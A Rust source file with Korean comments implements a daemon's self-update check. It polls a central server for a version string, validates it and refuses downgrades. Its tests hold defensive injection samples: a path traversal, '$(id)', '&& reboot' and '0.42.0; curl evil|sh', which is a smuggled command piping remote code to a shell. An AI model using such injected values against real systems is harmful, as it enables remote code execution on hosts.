//! 중앙(rca-web)이 선언한 목표 버전으로 aicd가 스스로 업데이트한다.
//!
//! **pull이다.** 중앙은 aicd에 연결하지 않는다. aicd가 주기적으로 물어보고,
//! 받을지 말지는 여기서 정한다. 중앙이 내려주는 것은 **버전 문자열 하나**이고
//! 다운로드 위치는 이 binary가 가진 상수(`update::REPO`)다 — 중앙을 쥔 쪽이
//! "릴리스된 것 중 무엇을 쓸지"는 정해도 "어떤 코드가 도는지"는 정하지 못한다.
//! 응답에서 URL을 받아 쓰기 시작하는 순간 그 성질이 사라지므로, 이 모듈은
//! `desired_version` 외의 필드를 의도적으로 읽지 않는다.
//!
//! 교체 자체는 `aic update --to <tag>`에 맡긴다. sha256 검증, atomic rename,
//! 권한 없을 때의 fallback, 교체 후 aicd 재시작이 이미 거기 있다. 데몬이 같은
//! 일을 한 벌 더 구현하면 두 경로가 갈라진다.

use std::process::Stdio;
use std::time::Duration;

use serde::Deserialize;

/// 중앙이 주는 것은 이것뿐이다. 필드를 늘리기 전에 모듈 주석을 읽을 것.
#[derive(Debug, Deserialize)]
struct AgentConfig {
    /// 목표가 선언되지 않았으면 `None` — 쓰던 버전에 그대로 머문다.
    desired_version: Option<String>,
}

/// 확인 task가 남기는 상태. `GetSelfUpdateStatus`가 이걸 읽어 간다.
///
/// `Mutex` 하나로 둔 이유: 확인은 기본 1시간에 한 번이라 경합이 없고, 담을 값이 문자열 둘이라
/// 원자 타입으로 쪼갤 수 없다.
#[derive(Debug, Default)]
pub struct SelfUpdateHealth {
    configured: std::sync::atomic::AtomicBool,
    live: std::sync::atomic::AtomicBool,
    interval_secs: std::sync::atomic::AtomicU64,
    last: std::sync::Mutex<Option<LastCheck>>,
}

#[derive(Debug, Clone)]
struct LastCheck {
    unix_secs: u64,
    desired_version: Option<String>,
    outcome: String,
}

impl SelfUpdateHealth {
    pub fn new() -> Self {
        Self::default()
    }

    /// config에서 켜 두었는지 기록한다(aicd_main이 기동 시 1회).
    pub fn set_configured(&self, configured: bool, interval: Duration) {
        use std::sync::atomic::Ordering;
        self.configured.store(configured, Ordering::Relaxed);
        self.interval_secs
            .store(interval.as_secs(), Ordering::Relaxed);
    }

    /// 확인 task의 생존 여부. task 안의 가드가 종료 시 끈다.
    pub fn set_live(&self, live: bool) {
        self.live.store(live, std::sync::atomic::Ordering::Relaxed);
    }

    /// 확인 한 번의 결과를 남긴다. 중앙에 닿지 못한 경우도 결과다 — 그걸 남기지 않으면
    /// "한 번도 확인 안 함"과 "계속 실패 중"을 구분할 수 없다.
    pub fn record_check(&self, desired_version: Option<String>, outcome: impl Into<String>) {
        let entry = LastCheck {
            unix_secs: unix_now_secs(),
            desired_version,
            outcome: outcome.into(),
        };
        if let Ok(mut slot) = self.last.lock() {
            *slot = Some(entry);
        }
    }

    pub fn snapshot(&self) -> aic_common::SelfUpdateStatus {
        use std::sync::atomic::Ordering;
        let last = self.last.lock().ok().and_then(|slot| slot.clone());
        aic_common::SelfUpdateStatus {
            configured: self.configured.load(Ordering::Relaxed),
            live: self.live.load(Ordering::Relaxed),
            interval_secs: self.interval_secs.load(Ordering::Relaxed),
            last_check_secs_ago: last
                .as_ref()
                .map(|l| unix_now_secs().saturating_sub(l.unix_secs)),
            desired_version: last.as_ref().and_then(|l| l.desired_version.clone()),
            last_outcome: last.map(|l| l.outcome),
            current_version: env!("CARGO_PKG_VERSION").to_string(),
        }
    }
}

/// 확인 task가 죽으면 `live`를 반드시 되돌리는 RAII 가드. exporter의 `AgentLiveGuard`와 같은
/// 이유다 — "떴다"를 래치하면 task가 panic으로 죽은 뒤에도 살아 있다고 보고한다.
struct LiveGuard(std::sync::Arc<SelfUpdateHealth>);

impl Drop for LiveGuard {
    fn drop(&mut self) {
        self.0.set_live(false);
    }
}

fn unix_now_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

/// 확인 한 번의 결과.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Decision {
    /// `tag`으로 업데이트한다.
    Update { tag: String },
    /// 아무것도 하지 않는다. `why`는 로그용.
    Stay { why: &'static str },
}

/// 목표 버전과 현재 버전을 놓고 무엇을 할지 정한다.
///
/// 순수 함수로 떼어 둔 이유는 여기가 이 모듈에서 유일하게 틀리면 위험한
/// 부분이기 때문이다 — 네트워크나 프로세스 실행 없이 전부 검증할 수 있어야 한다.
pub fn decide(desired: Option<&str>, current: &str) -> Decision {
    let Some(desired) = desired.map(str::trim).filter(|v| !v.is_empty()) else {
        return Decision::Stay {
            why: "중앙이 목표 버전을 선언하지 않음",
        };
    };
    // 중앙이 버전 아닌 것을 보냈다면 그건 우리가 이해할 값이 아니다. 받아서
    // `aic update --to`에 넘기면 그 문자열이 URL 조립에 들어간다.
    if !is_plain_version(desired) {
        return Decision::Stay {
            why: "목표 버전 형식이 아님",
        };
    }
    match aic_common::semver::compare(desired, current) {
        1 => Decision::Update {
            tag: to_tag(desired),
        },
        // 다운그레이드 거부. 중앙이 침해되거나 실수로 낮은 값을 선언해도,
        // 함대 전체를 옛 취약 버전으로 되돌리지는 못한다.
        -1 => Decision::Stay {
            why: "목표가 현재보다 낮음 — 다운그레이드 거부",
        },
        _ => Decision::Stay {
            why: "이미 목표 버전",
        },
    }
}

/// 릴리스 tag과 조립되는 값이므로 버전 글자만 허용한다. 중앙 쪽에서도 같은
/// 검증을 하지만, 그쪽을 신뢰해서 이 성질이 성립하는 것은 아니다.
fn is_plain_version(v: &str) -> bool {
    let body = v.strip_prefix('v').unwrap_or(v);
    !body.is_empty()
        && body
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '+'))
}

fn to_tag(v: &str) -> String {
    if v.starts_with('v') {
        v.to_string()
    } else {
        format!("v{v}")
    }
}

/// 한 주기에서 물어볼 주소.
fn config_url(endpoint: &str) -> String {
    format!("{}/v1/agent/config", endpoint.trim_end_matches('/'))
}

/// 호스트마다 다음 확인 시각을 흩어 놓는다.
///
/// 함대가 같은 주기로 켜지면 같은 순간에 같은 버전으로 한꺼번에 움직인다.
/// 나쁜 버전이 하나 나가면 전 호스트가 동시에 죽고, 그걸 감지할 수집 경로도
/// 같이 사라진다. 절반 폭으로 흩어 두면 최소한 순차적으로 드러난다.
fn jittered(interval: Duration) -> Duration {
    let half = interval.as_secs() / 2;
    if half == 0 {
        return interval;
    }
    // 호스트 이름 해시로 흩는다 — 난수와 달리 재시작해도 같은 자리에 있어서
    // "이 호스트는 항상 늦게 받는다"가 재현 가능하다.
    let seed = hostname_seed();
    interval + Duration::from_secs(seed % half)
}

fn hostname_seed() -> u64 {
    let name = std::env::var("HOSTNAME")
        .ok()
        .or_else(|| {
            std::fs::read_to_string("/etc/hostname")
                .ok()
                .map(|s| s.trim().to_string())
        })
        .unwrap_or_default();
    name.bytes().fold(1469598103934665603u64, |h, b| {
        (h ^ u64::from(b)).wrapping_mul(1099511628211)
    })
}

/// 목표 버전을 한 번 확인하고, 필요하면 `aic update`를 돌린다.
async fn tick(
    client: &reqwest::Client,
    endpoint: &str,
    token: Option<&str>,
    current: &str,
    health: &SelfUpdateHealth,
) {
    let mut req = client.get(config_url(endpoint));
    if let Some(t) = token {
        req = req.bearer_auth(t);
    }
    let resp = match req.send().await {
        Ok(r) => r,
        Err(err) => {
            // 중앙에 못 닿는 것은 정상 상태의 하나다(네트워크 단절, 재배포 중).
            // 다음 주기에 다시 묻는다.
            tracing::debug!(error = %err, "목표 버전 조회 실패 — 다음 주기에 재시도");
            health.record_check(None, format!("중앙에 닿지 못함: {err}"));
            return;
        }
    };
    if !resp.status().is_success() {
        tracing::warn!(status = %resp.status(), "목표 버전 조회가 거부됨 — 수집 토큰을 확인하세요");
        health.record_check(None, format!("조회 거부됨 (HTTP {})", resp.status()));
        return;
    }
    // reqwest의 `json` 기능은 이 크레이트에서 의도적으로 꺼져 있다(protobuf만
    // 보내려고). 이 한 건 때문에 켜지 않는다.
    let body = match resp.text().await {
        Ok(b) => b,
        Err(err) => {
            tracing::warn!(error = %err, "목표 버전 응답을 읽지 못함");
            health.record_check(None, format!("응답을 읽지 못함: {err}"));
            return;
        }
    };
    let cfg: AgentConfig = match serde_json::from_str(&body) {
        Ok(c) => c,
        Err(err) => {
            tracing::warn!(error = %err, "목표 버전 응답을 해석하지 못함");
            health.record_check(None, format!("응답을 해석하지 못함: {err}"));
            return;
        }
    };

    match decide(cfg.desired_version.as_deref(), current) {
        Decision::Stay { why } => {
            tracing::debug!(why, current, desired = ?cfg.desired_version, "업데이트하지 않음");
            health.record_check(cfg.desired_version.clone(), why);
        }
        Decision::Update { tag } => {
            tracing::info!(current, %tag, "목표 버전으로 셀프업데이트 시작");
            health.record_check(
                cfg.desired_version.clone(),
                format!("{tag}으로 업데이트 시작"),
            );
            run_update(&tag).await;
        }
    }
}

/// `aic update --to <tag>` 실행.
///
/// stdin을 막는 이유: 교체 대상 디렉토리에 권한이 없으면 `aic update`가
/// `sudo install`로 넘어가는데, 데몬에는 TTY가 없다. 열어 두면 비밀번호를
/// 기다리며 멈출 수 있다. 막아 두면 즉시 실패하고 로그가 남는다 — 권한이
/// 없는 호스트는 조용히 안 되는 것보다 안 됐다고 말하는 편이 낫다.
async fn run_update(tag: &str) {
    let exe = match which_aic() {
        Some(p) => p,
        None => {
            tracing::warn!("`aic` 실행 파일을 찾지 못해 셀프업데이트를 건너뜀");
            return;
        }
    };
    let out = tokio::process::Command::new(&exe)
        .args(["update", "--to", tag])
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .await;
    match out {
        Ok(o) if o.status.success() => {
            // `aic update`가 교체 후 aicd를 재시작하므로, 성공했다면 이 프로세스는
            // 곧 사라진다. 그 전에 한 줄 남긴다.
            tracing::info!(%tag, "셀프업데이트 완료 — aicd가 재시작된다");
        }
        Ok(o) => {
            tracing::warn!(
                %tag,
                status = ?o.status.code(),
                stderr = %String::from_utf8_lossy(&o.stderr).trim(),
                "셀프업데이트 실패 — 현재 버전을 유지한다"
            );
        }
        Err(err) => tracing::warn!(error = %err, "`aic update` 실행 실패"),
    }
}

/// 나란히 설치된 `aic`. aicd와 같은 디렉토리에 있다(release archive가 셋을 함께
/// 담고 `aic update`가 셋을 함께 교체한다).
fn which_aic() -> Option<std::path::PathBuf> {
    if let Ok(me) = std::env::current_exe() {
        if let Some(dir) = me.parent() {
            let candidate = dir.join("aic");
            if candidate.is_file() {
                return Some(candidate);
            }
        }
    }
    None
}

/// 폴링 루프를 띄운다. 다른 exporter task와 같은 shutdown watch를 구독해
/// graceful하게 끝난다 — 이미 시작된 `aic update`는 별도 프로세스라 여기서
/// 끊어도 중간에 잘리지 않는다.
pub fn spawn(
    endpoint: String,
    token: Option<String>,
    interval: Duration,
    health: std::sync::Arc<SelfUpdateHealth>,
    mut shutdown: tokio::sync::watch::Receiver<bool>,
) -> tokio::task::JoinHandle<()> {
    let current = env!("CARGO_PKG_VERSION").to_string();
    health.set_live(true);
    tokio::spawn(async move {
        let _live = LiveGuard(health.clone());
        let client = match reqwest::Client::builder()
            .timeout(Duration::from_secs(15))
            .user_agent(concat!("aicd/", env!("CARGO_PKG_VERSION")))
            .build()
        {
            Ok(c) => c,
            Err(err) => {
                tracing::warn!(error = %err, "셀프업데이트 HTTP 클라이언트 생성 실패 — 비활성");
                return;
            }
        };
        let period = jittered(interval);
        tracing::info!(
            endpoint = %endpoint,
            period_secs = period.as_secs(),
            current = %current,
            "셀프업데이트 활성 — 중앙이 선언한 목표 버전을 주기적으로 확인한다"
        );
        loop {
            // 뜨자마자 받지 않는다. 재시작 루프에 빠진 호스트가 매 기동마다
            // 중앙을 두드리는 것을 막는다.
            tokio::select! {
                _ = tokio::time::sleep(period) => {}
                _ = shutdown.changed() => {
                    tracing::debug!("셀프업데이트 종료");
                    return;
                }
            }
            tick(&client, &endpoint, token.as_deref(), &current, &health).await;
        }
    })
}

#[cfg(test)]
mod tests {
    use super::{config_url, decide, Decision, SelfUpdateHealth};
    use std::time::Duration;

    #[test]
    fn an_unconfigured_health_says_so_instead_of_looking_idle() {
        // "안 켰다"와 "켰는데 아직 확인 안 함"은 사용자가 할 일이 다르다.
        let h = SelfUpdateHealth::new();
        let s = h.snapshot();
        assert!(!s.configured);
        assert!(!s.live);
        assert_eq!(s.last_check_secs_ago, None);
        assert_eq!(s.current_version, env!("CARGO_PKG_VERSION"));
    }

    #[test]
    fn configured_and_live_are_independent_axes() {
        // 켜 두었는데 task가 뜨지 못한 상태를 표현할 수 있어야, "설정을 켜라"는 오진 대신
        // "로그를 보라"고 안내할 수 있다.
        let h = SelfUpdateHealth::new();
        h.set_configured(true, Duration::from_secs(3600));
        let s = h.snapshot();
        assert!(s.configured);
        assert!(!s.live, "설정만으로 살아 있다고 보고하면 안 된다");
        assert_eq!(s.interval_secs, 3600);
    }

    #[test]
    fn a_check_records_the_target_and_the_verdict() {
        let h = SelfUpdateHealth::new();
        h.set_configured(true, Duration::from_secs(60));
        h.set_live(true);
        h.record_check(Some("0.42.0".to_string()), "목표가 현재보다 낮음");

        let s = h.snapshot();
        assert!(s.live);
        assert_eq!(s.desired_version.as_deref(), Some("0.42.0"));
        assert_eq!(s.last_outcome.as_deref(), Some("목표가 현재보다 낮음"));
        assert!(s.last_check_secs_ago.is_some_and(|secs| secs <= 1));
    }

    #[test]
    fn an_unreachable_central_is_still_a_recorded_check() {
        // 이걸 남기지 않으면 "한 번도 확인 안 함"과 "계속 실패 중"이 같아 보인다.
        let h = SelfUpdateHealth::new();
        h.record_check(None, "중앙에 닿지 못함: connection refused");
        let s = h.snapshot();
        assert_eq!(s.desired_version, None);
        assert!(s.last_outcome.is_some_and(|o| o.contains("닿지 못함")));
        assert!(s.last_check_secs_ago.is_some());
    }

    fn tag(d: Decision) -> String {
        match d {
            Decision::Update { tag } => tag,
            Decision::Stay { why } => panic!("업데이트를 기대했으나 멈춤: {why}"),
        }
    }

    #[test]
    fn a_newer_target_updates_and_is_normalized_to_a_tag() {
        assert_eq!(tag(decide(Some("0.42.0"), "0.41.5")), "v0.42.0");
        assert_eq!(tag(decide(Some("v0.42.0"), "0.41.5")), "v0.42.0");
    }

    #[test]
    fn a_lower_target_is_refused() {
        // 중앙이 침해되거나 실수해도 함대를 옛 버전으로 되돌리지 못한다.
        assert!(matches!(
            decide(Some("0.40.0"), "0.41.5"),
            Decision::Stay { .. }
        ));
    }

    #[test]
    fn the_same_version_does_nothing() {
        assert!(matches!(
            decide(Some("0.41.5"), "0.41.5"),
            Decision::Stay { .. }
        ));
        assert!(matches!(
            decide(Some("v0.41.5"), "0.41.5"),
            Decision::Stay { .. }
        ));
    }

    #[test]
    fn no_declared_target_does_nothing() {
        assert!(matches!(decide(None, "0.41.5"), Decision::Stay { .. }));
        assert!(matches!(
            decide(Some("   "), "0.41.5"),
            Decision::Stay { .. }
        ));
    }

    #[test]
    fn anything_that_is_not_a_bare_version_is_refused() {
        // 이 문자열은 릴리스 tag과 조립되어 URL이 된다. 중앙도 같은 검증을
        // 하지만, 그쪽을 신뢰해서 성립하는 성질이 아니다.
        for bad in [
            "https://evil.example/aic",
            "../../../etc",
            "0.42.0; curl evil|sh",
            "0.42.0 && reboot",
            "$(id)",
            "0.42.0/../0.1.0",
        ] {
            assert!(
                matches!(decide(Some(bad), "0.41.5"), Decision::Stay { .. }),
                "거부해야 함: {bad:?}"
            );
        }
    }

    #[test]
    fn the_url_is_built_from_the_exporter_endpoint() {
        assert_eq!(
            config_url("https://rca.example"),
            "https://rca.example/v1/agent/config"
        );
        assert_eq!(
            config_url("https://rca.example/"),
            "https://rca.example/v1/agent/config"
        );
    }
}
